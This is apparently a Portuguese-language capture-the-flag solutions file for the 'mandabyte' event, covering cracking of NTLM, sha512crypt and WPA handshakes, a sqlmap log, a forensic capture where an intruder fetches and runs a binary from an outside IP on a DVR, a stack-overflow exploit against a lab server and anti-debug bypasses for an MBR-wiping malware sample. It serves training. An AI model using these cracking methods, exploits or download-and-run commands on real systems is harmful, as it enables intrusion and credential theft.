@@ -1,0 +1,615 @@
+=============
+CRIPTOGRAFIA
+=============
+-------
+CRY100
+-------
+
+eder@0xffff:/tmp$ unzip cry100.zip 
+Archive:  cry100.zip
+  inflating: SAM2                    
+  inflating: SYSTEM2                 
+eder@0xffff:/tmp$ pwdump SYSTEM2 SAM2 
+Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Admin:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+ccoc:1001:aad3b435b51404eeaad3b435b51404ee:0dbe6563a9ca8de43e2d73685b09bc64:::
+
+pegar o NTLMHASH e colocar no site https://hashkiller.co.uk/ntlm-decrypter.aspx
+
+teremos a senha: 0dbe6563a9ca8de43e2d73685b09bc64 NTLM : s3cr3t0
+
+mandabyte{s3cr3t0}
+
+--------
+CRY200
+--------
+
+na maquina 192.168.10.158
+root@exploit1:~# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+landscape:x:103:109::/var/lib/landscape:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+snmp:x:105:112::/var/lib/snmp:/bin/false
+nginx:x:106:113:nginx user,,,:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:107:115:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:108:116:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:109:117:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:110:118:systemd Bus Proxy,,,:/run/systemd:/bin/false
+uuidd:x:100:101::/run/uuidd:/bin/false
+_apt:x:111:65534::/nonexistent:/bin/false
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+smmta:x:113:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:114:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+jpeguser:x:1000:1000::/home/jpeguser:
+ftp:x:115:124:ftp daemon,,,:/srv/ftp:/bin/false
+mandabyte:x:1001:1001:,,,:/home/mandabyte:/bin/bash
+
+shadow.....
+
+Criar um arquivo senha.txt com o hash da senha abaixo:
+mandabyte:$6$PUfvkQvz$20H0NcVe7NdNKd/lSdomLfJWBnLRl40Xc2kqrFyx40Rw4THvVqdbN4yMkz.AcJZKi6V0YPrJFsDagZWmbpw7U1:17730:0:99999:7:::
+
+#john --format=sha512crypt /tmp/senha.txt --wordlist=rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:22:50 7.51% (ETA: 19:22:00) 0g/s 891.7p/s 891.7c/s 891.7C/s thetouch8..thesya
+0g 0:00:42:56 14.44% (ETA: 19:15:24) 0g/s 886.6p/s 886.6c/s 886.6C/s 326066..3258060
+0g 0:01:03:49 21.94% (ETA: 19:08:59) 0g/s 874.1p/s 874.1c/s 874.1C/s tay1596..tay11112530
+0g 0:01:29:51 31.38% (ETA: 19:04:28) 0g/s 863.5p/s 863.5c/s 863.5C/s pinkcharlene..pinkcat1996
+0g 0:02:30:27 53.52% (ETA: 18:59:13) 0g/s 858.1p/s 858.1c/s 858.1C/s gurunemo4u..gurugami
+0g 0:02:43:45 58.56% (ETA: 18:57:45) 0g/s 859.7p/s 859.7c/s 859.7C/s e4bandrew..e4784525208
+0g 0:02:43:47 58.57% (ETA: 18:57:46) 0g/s 859.7p/s 859.7c/s 859.7C/s e210875..e2031193
+0181820          (?)
+1g 0:04:31:27 DONE (2018-08-23 18:49) 0.000061g/s 870.3p/s 870.3c/s 870.3C/s 01818986018..01818132340
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+Ou
+
+hashcat -a 0 -m 1800 hash-mandabyte.txt /usr/share/wordlists/rockyou.txt --force
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$PUfvkQvz$20H0NcVe7NdNKd/lSdomLfJWBnLRl40Xc2kqrFy...bpw7U1
+Time.Started.....: Thu Aug 23 22:32:07 2018 (3 hours, 5 mins)
+Time.Estimated...: Fri Aug 24 01:37:24 2018 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.Dev.#1.....:     1311 H/s (5.19ms) @ Accel:128 Loops:64 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 14175744/14344385 (98.82%)
+Rejected.........: 0/14175744 (0.00%)
+Restore.Point....: 14175232/14344385 (98.82%)
+Candidates.#1....: 01825644270125582415 -> 01817583281
+HWMon.Dev.#1.....: N/A
+
+Started: Thu Aug 23 22:32:06 2018
+Stopped: Fri Aug 24 01:37:25 2018
+
+hashcat -a 0 -m 1800 hash-mandabyte.txt /usr/share/wordlists/rockyou.txt --show
+$6$PUfvkQvz$20H0NcVe7NdNKd/lSdomLfJWBnLRl40Xc2kqrFyx40Rw4THvVqdbN4yMkz.AcJZKi6V0YPrJFsDagZWmbpw7U1:0181820
+
+mandabyte{0181820}
+
+--------------
+CRY300
+--------------
+
+SOLUCAO CRY300 - HANDSHAKE WIFI
+
+# aircrack-ng -w /root/dicionarios/rockyou.txt cry300.cap
+
+
+
+      Time left: 18 minutes, 27 seconds                          0.10%
+
+                           KEY FOUND! [ confusion ]
+
+
+      Master Key     : 17 51 E5 43 BE 1E 54 B9 42 76 CE F1 60 14 E5 BC 
+                       09 EC DF 28 77 0D 72 BB 37 55 98 F7 8A 82 F2 D4 
+
+      Transient Key  : ED E7 D4 E9 1E 51 0D C2 38 5C BF E5 E7 2E F3 DE 
+                       2D 5E 81 F2 38 CB 7D CA DF 4F CD FE 8D DB 98 DB 
+                       EE E4 14 81 AC 1C 02 D2 2A 5F 15 BA 07 27 3F 0D 
+                       A6 A2 AF 9E 95 6F 55 00 00 10 E3 A4 67 3F 32 00 
+
+      EAPOL HMAC     : 8A 09 8C 26 E2 93 B5 6A 2A 49 07 79 1F 70 62 6C 
+root@0xffff:/home/eder/desktop/MANDABYTE5# 
+
+============
+MISCELANEA
+============
+MIS100
+------
+log
+629886223    - - [15/Nov/2015:16:01:32 +0000] "POST /login.php?username=root%22%20AND%20ORD%28MID%28%28SELECT%204%20FROM%20information_schema.TABLES%20LIMIT%2 HTTP/1.1" 200 211 "-" "sqlmap"
+
+Colocar no site: https://www.browserling.com/tools/dec-to-ip
+teremos o ip 37.139.77.15
+
+Ou pelo python
+# python -c 'from re import findall; print ".".join([str(int(i, 16)) for i in findall(".{2}", hex(629886223)[2:])])'
+37.139.77.15
+
+mandabyte{37.139.77.15}
+
+------
+MIS200
+------
+root@0xffff:/tmp# ssh emanuel@192.168.10.113
+The authenticity of host '192.168.10.113 (192.168.10.113)' can't be established.
+RSA key fingerprint is SHA256:GqFihLeikz+nbPU3+rFBPe8CmHofVOuSYJOzJJrkeok.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.10.113' (RSA) to the list of known hosts.
+emanuel@192.168.10.113's password: 
+Linux maq113 2.6.26-1-686 #1 SMP Sat Jan 10 18:29:31 UTC 2009 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Aug 13 13:35:58 2018
+emanuel@maq113:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+statd:x:102:65534::/var/lib/nfs:/bin/false
+bind:x:103:106::/var/cache/bind:/bin/false
+emanuel:x:1000:1000:emanuel,mandabyte{356cc8a13d3dc07b2da0916fab361a2f},,:/home/emanuel:/bin/bash
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+snmp:x:105:65534::/var/lib/snmp:/bin/false
+mysql:x:106:109:MySQL Server,,,:/var/lib/mysql:/bin/false
+telnetd:x:107:112::/nonexistent:/bin/false
+teta:x:0:0::/home/teta:/bin/sh
+ceh1:x:1004:1004::/home/ceh1:/bin/sh
+
+mandabyte{356cc8a13d3dc07b2da0916fab361a2f}
+
+-------
+MIS300
+-------
+root@0xffff:/tmp# tar -xzvf mis300.tar.gz 
+mis300.txt
+
+root@0xffff:/tmp# file mis300.txt 
+mis300.txt: data
+
+ao rodar o comando hexdump mis300.txt podemos ver que eh um jpeg porem com FF D9 o magic number do jpeg eh FF D8
+entao basta trocar o 9 pelo 8 e consertar o magic number do arquivo
+
+root@0xffff:/tmp# hexedit mis300.txt
+
+agora sim:
+root@0xffff:/tmp# file mis300.txt
+mis300.txt: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.8.22], progressive, precision 8, 1200x800, frames 3
+
+root@0xffff:/tmp# mv mis300.txt mis300.jpg
+root@0xffff:/tmp# chmod 777 mis300.jpg
+
+acessar a imagem e coletar a flag
+
+mandabyte{fa2ef6e71e8a6ba50e9f6817d349c7d6}
+
+==========
+FORENSE
+==========
+------
+FOR100
+-------
+
+FOR100.PCAP  fonte: https://www.dshield.org/forums/diary/Coin+Mining+DVRs+A+compromise+from+start+to+finish/18071/diaryimages/dvrminer.pcap
+
+(FOR100) Neste PCAP temos um comprometimento de um DVR voltado para internet com senha fraca cujo hacker consegue por bruteforce descobrir a senha do root e entrar no sistema.
+qual o PID do processo de nome "sh" rodado pelo usuario "guest" ?
+
+
+Solução: rodar o comando chaosreader em cima do pcap e extrair de um telnet:
+
+telnet: 142.0.45.42:43848 -> 192.168.1.100:23
+File for100.pcap, Session 1
+...............
+
+dvrdvs login: .........root
+root
+Password: 12345
+
+
+
+BusyBox v1.16.1 (2013-03-07 14:13:05 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+can not change to guest!
+.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/] .[35m# .[0mcat /proc/version && echo -ne '\x64\x6f\x6e\x65'
+cat /proc/version && echo -ne '\x64\x6f\x6e\x65'
+Linux version 3.0.8 (bsp@WindRiver) (gcc version 4.4.1 (Hisilicon_v100(gcc4.4-290+uclibc_0.9.32.1+eabi+linux
+>pthread)) ) #18 Thu Oct 17 16:41:31 CST 2013
+done.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/] .[35m# .[0mps && echo -ne '\x64\x6f\x6e\x65'
+ps && echo -ne '\x64\x6f\x6e\x65'
+  PID USER       VSZ STAT COMMAND
+    1 root      1160 S    init
+    2 root         0 SW   [kthreadd]
+    3 root         0 SW   [ksoftirqd/0]
+    4 root         0 SW   [kworker/0:0]
+    6 root         0 SW   [rcu_kthread]
+    7 root         0 SW<  [khelper]
+    8 root         0 SW   [kworker/u:1]
+  142 root         0 SW   [sync_supers]
+  144 root         0 SW   [bdi-default]
+  146 root         0 SW<  [kblockd]
+  162 root         0 SW   [khubd]
+  262 root         0 SW   [kswapd0]
+  317 root         0 SW<  [crypto]
+  393 root         0 SW<  [iscsi_eh]
+  406 root         0 SW   [scsi_eh_0]
+  409 root         0 SW   [scsi_eh_1]
+  412 root         0 SW   [kworker/u:2]
+  423 root         0 SW   [mtdblock0]
+  428 root         0 SW   [mtdblock1]
+  493 root         0 SW   [kworker/0:2]
+  519 root       872 S <  /sbin/udevd -d
+  523 root         0 SWN  [jffs2_gcd_mtd1]
+  528 root      1168 S    /usr/sbin/telnetd 32
+  549 root         0 SW   [flush-1:0]
+  775 root      548m S    ./hicore
+  776 root      1164 S    -/bin/sh
+  777 guest     1168 S    sh
+  785 root         0 SW   [VideoDec]
+  820 root         0 SW   [flush-8:0]
+ 7902 root      1168 S    -sh
+ 7945 root      1160 R    ps
+done.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/] .[35m# .[0mecho -ne '\x73\x75\x70\x70\x6f\x72\x74\x65\x64'
+echo -ne '\x73\x75\x70\x70\x6f\x72\x74\x65\x64'
+
+mandabyte{777}
+
+--------
+(FOR200)
+--------
+ Qual o nome do ultimo comando rodado pelo hacker que invadiu o DVR que causou uma falha de segmentação ?
+
+
+solução:
+rodar o comando chaosreader no pcap e extrair do ultimo telnet:
+
+.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/] .[35m# .[0mcd /dev/
+cd /dev/
+.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/dev] .[35m# .[0mchmod 777 /dev/lol
+chmod 777 /dev/lol
+.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/dev] .[35m# .[0m/dev/lol http://107.178.66.153/arm
+/dev/lol http://107.178.66.153/arm
+.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/dev] .[35m# .[0mchmod 777 /dev/arm
+chmod 777 /dev/arm
+.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/dev] .[35m# .[0m/dev/arm
+/dev/arm
+Segmentation fault
+.[32m[root.[0m@.[31mdvrdvs.[0m .[32m/dev] .[35m# .[0m
+
+ultimo telnet do pacote capturado.
+mandabyte{arm}  
+
+
+--------------
+FOR300
+-----------
+
+Qual a senha do usuário EXPLOIT presente de alguma forma na máquina ATQ300 - 192.168.10.161 ?
+
+ deu pra ouvir as credenciais de acesso:
+ 
+ usuario: exploit
+ senha: h@ck3r1@b
+
+mandabyte{h@ck3r1@b}
+
+===================
+ENGENHARIA REVERSA
+===================
+REV100
+
+eder@0xffff:$ strings rev100 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+strcpy
+puts
+__libc_start_main
+__gmon_start__
+GLIBC_2.2.5
+fffff.
+[]A\A]A^A_
+Execu
+o Hackeada! segue a dica da flag: 00110000 00110000 00110100 01100101 01100101 01100110 00110101 00110101 00110010 01100100 00110010 00110001 01100010 01100101 00110001 00110010 01100100 00110101 00110110 00110110 00110000 00110000 00110000 01100010 00110000 00110101 01100001 00111000 00110101 00110111 00110010 00110010
+Executando de forma normal, pois voce entrou com a quantidade certa permitida na vari
+;*3$"
+
+- converter de binario para ascII: http://www.roubaixinteractive.com/PlayGround/Binary_Conversion/Binary_To_Text.asp
+flag: 004eef552d21be12d566000b05a85722
+
+mandabyte{004eef552d21be12d566000b05a85722}
+
+
+-------
+REV200
+------
+
+RESOLUÇÃO DO DESAFIO
+====================
+David da Silva Polverari
+
+Utilizando a ferramenta `file`, observamos que o arquivo é um executável no
+formato ELF 32-bit, para a arquitetura Intel 80386 e sistemas operacionais
+GNU/Linux:
+
+----
+$ file eas 
+eas: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically
+linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
+BuildID[sha1]=0cc623e954590e451f68e09177037ec699f78072, not stripped
+----
+
+Baseado nessas informações, podemos realizar um _disassembly_ do arquivo em
+uma VM Linux para verificarmos o que ele faz. Podemos utilizar o GDB para
+isso:
+
+----
+polverari@mercurius:mb4$ gdb eas
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from eas...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000480  _init
+0x000004c0  setbuf@plt
+0x000004d0  printf@plt
+0x000004e0  gets@plt
+0x000004f0  puts@plt
+0x00000500  system@plt
+0x00000510  exit@plt
+0x00000520  __libc_start_main@plt
+0x00000540  _start
+0x00000580  __x86.get_pc_thunk.bx
+0x00000590  deregister_tm_clones
+0x000005d0  register_tm_clones
+0x00000620  __do_global_dtors_aux
+0x00000670  frame_dummy
+0x000006ac  __x86.get_pc_thunk.dx
+0x000006b0  main
+0x00000780  __libc_csu_init
+0x000007e0  __libc_csu_fini
+0x000007e4  _fini
+----
+
+Percebemos que, além das funções da libc utilizadas pelo programa e aquelas do
+ambiente runtime C incluídas pelo GCC em todos os executáveis, o programa
+somente possui a função main(), que é a função dos programas em C chamada
+automaticamente pelo sistema operacional quando o programa é exeecutado. Então
+vamos fazer o disassembly dessa função para examinar o que o programa faz:
+
+----
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x000006b0 <+0>:	lea    ecx,[esp+0x4]
+   0x000006b4 <+4>:	and    esp,0xfffffff0
+   0x000006b7 <+7>:	push   DWORD PTR [ecx-0x4]
+   0x000006ba <+10>:	push   ebp
+   0x000006bb <+11>:	mov    ebp,esp
+   0x000006bd <+13>:	push   ebx
+   0x000006be <+14>:	push   ecx
+   0x000006bf <+15>:	sub    esp,0x20
+   0x000006c2 <+18>:	call   0x580 <__x86.get_pc_thunk.bx>
+   0x000006c7 <+23>:	add    ebx,0x1939
+   0x000006cd <+29>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x000006d4 <+36>:	mov    eax,DWORD PTR [ebx-0x10]
+   0x000006da <+42>:	mov    eax,DWORD PTR [eax]
+   0x000006dc <+44>:	sub    esp,0x8
+   0x000006df <+47>:	push   0x0
+   0x000006e1 <+49>:	push   eax
+   0x000006e2 <+50>:	call   0x4c0 <setbuf@plt>
+   0x000006e7 <+55>:	add    esp,0x10
+   0x000006ea <+58>:	sub    esp,0xc
+   0x000006ed <+61>:	lea    eax,[ebx-0x1800]
+   0x000006f3 <+67>:	push   eax
+   0x000006f4 <+68>:	call   0x4f0 <puts@plt>
+   0x000006f9 <+73>:	add    esp,0x10
+   0x000006fc <+76>:	sub    esp,0xc
+   0x000006ff <+79>:	lea    eax,[ebx-0x17d8]
+   0x00000705 <+85>:	push   eax
+   0x00000706 <+86>:	call   0x4d0 <printf@plt>
+   0x0000070b <+91>:	add    esp,0x10
+   0x0000070e <+94>:	sub    esp,0xc
+   0x00000711 <+97>:	lea    eax,[ebp-0x20]
+   0x00000714 <+100>:	push   eax
+   0x00000715 <+101>:	call   0x4e0 <gets@plt>
+   0x0000071a <+106>:	add    esp,0x10
+   0x0000071d <+109>:	cmp    DWORD PTR [ebp-0xc],0x37333331
+   0x00000724 <+116>:	jne    0x74c <main+156>
+   0x00000726 <+118>:	sub    esp,0xc
+   0x00000729 <+121>:	lea    eax,[ebx-0x17ac]
+   0x0000072f <+127>:	push   eax
+   0x00000730 <+128>:	call   0x4f0 <puts@plt>
+   0x00000735 <+133>:	add    esp,0x10
+   0x00000738 <+136>:	sub    esp,0xc
+   0x0000073b <+139>:	lea    eax,[ebx-0x1771]
+   0x00000741 <+145>:	push   eax
+   0x00000742 <+146>:	call   0x500 <system@plt>
+   0x00000747 <+151>:	add    esp,0x10
+   0x0000074a <+154>:	jmp    0x768 <main+184>
+   0x0000074c <+156>:	sub    esp,0xc
+   0x0000074f <+159>:	lea    eax,[ebx-0x1768]
+   0x00000755 <+165>:	push   eax
+   0x00000756 <+166>:	call   0x4f0 <puts@plt>
+   0x0000075b <+171>:	add    esp,0x10
+   0x0000075e <+174>:	sub    esp,0xc
+   0x00000761 <+177>:	push   0x1
+   0x00000763 <+179>:	call   0x510 <exit@plt>
+   0x00000768 <+184>:	mov    eax,0x0
+   0x0000076d <+189>:	lea    esp,[ebp-0x8]
+   0x00000770 <+192>:	pop    ecx
+   0x00000771 <+193>:	pop    ebx
+   0x00000772 <+194>:	pop    ebp
+   0x00000773 <+195>:	lea    esp,[ecx-0x4]
+   0x00000776 <+198>:	ret    
+End of assembler dump.
+(gdb)
+---- 
+
+A partir do offset 0x711, podemos perceber que a função gets() é chamada com
+um buffer que começa no endereço 32 bytes antes do endereço apontado por EBP
+(ebp-0x20). Logo em seguida, a partir do offset 0x71d, o programa compara a
+DWORD (um inteiro de 32 bits) localizado no endereço 12 bytes antes do
+endereço apontado por EBP (ebp-0xc) com o valor 0x37333331 e, caso positivo,
+fornece um shell ("/bin/sh") ao usuário através da chamada a system().
+
+Na execução normal do programa, essa variável é inicializada com o valor 0 e
+nunca é modificada diretamente pelo programa, logo não seria possível obter o
+shell. Além disso, como o programa que precisamos explorar para obter acesso
+estará executando remotamente, um patch no binário que recebemos não
+adiantaria de nada. Será necessário desenvolver um exploit para que uma
+entrada específica desencadeie o comportamento que precisamos para que o
+programa nos forneça o shell.
+
+A função gets(), que é usada no programa para copiar a entrada do usuário para
+o buffer reservado para o código de acesso, é uma função que não verifica os
+limites do buffer de destino antes de copiar o conteúdo recebido para ele,
+podendo causar um buffer overflow, sobrescrevendo o espaço reservado para
+outras variáveis na pilha.
+
+Uma vez que o endereço de início da váriavel que queremos sobrescrever com o
+valor esperado está afastado do início do buffer destinado ao código de
+segurança por 20 bytes (32 - 12), ao digitarmos uma string de entrada com mais
+de 20 bytes, poderemos sobrescrever o valor da variável conforme desejarmos.
+Agora, basta lembrar que na arquitetura Intel x86, os valores em memória são
+armazenados no formato little-endian, com os bytes menos significativos do
+valor em endereços de memória mais baixos do que os bytes mais significativos.
+Logo, os bytes que devemos colocar na string para que sejam interpretados como
+o valor correto são os bytes correspondentes aos caracteres ASCII: 1, 3, 3 e 7
+e nossa string de exploit terá o seguinte formato:
+
+----
+[ 20 bytes de padding ] + 1337
+----
+
+Vamos testar nosso exploit localmente:
+
+----
+polverari@mercurius:mb4$ ./eas
+
+EvilCorp Access Server v1.0
+
+Digite o código de acesso: AAAAAAAAAAAAAAAAAAAA1337
+
+[*] Seja bem-vindo ao EvilCorp Access Server!
+
+$
+----
+
+Funcionou! Obtivemos um shell na nossa própria máquina através do exploit
+desenvolvido. Agora, basta conectarmos ao servidor, utilizarmos nosso exploit
+para obter acesso via shell, buscar o arquivo flag.txt e copiar seu conteúdo:
+
+----
+polverari@mercurius:mb4$ nc 192.168.10.100 8000
+
+EvilCorp Access Server v1.0
+
+Digite o código de acesso: AAAAAAAAAAAAAAAAAAAA1337
+
+[*] Seja bem-vindo ao EvilCorp Access Server!
+
+ls
+flag.txt
+cat flag.txt
+mandabyte{80a5f8ef3a612e2b089601330446e8fa}
+exit
+
+
+-------
+REV300
+------
+Criação e Solução: Major Salema - Força Aérea
+
+Observação: este malware eh verdadeiro e apaga a MBR do seu computador. Manipular este malware apenas via maquina virtual e de maneira apropriada em um debugger
+
+primeiro passo:
+
+;bypass anti-debug int2d
+(0040100f) int2d -> jmp 004010f1
+
+Segundo passo:
+
+;peb->BeingDebugged
+(004010f7) MOV EAX,DWORD PTR FS:[18] -> jmp 0040110c
+
+Terceiro passo:
+
+;bypass no call simples para SEH
+(00401122) CALL 0040102B -> nop
+
+quarto passo:
+
+pegar a flag que vai estar dentro do arquivo "flag_is_here" que será criado na pasta do binário
+
+Flag: mandabyte{m@Lw4r3_RuleZ}
+
+
+
+
+
+
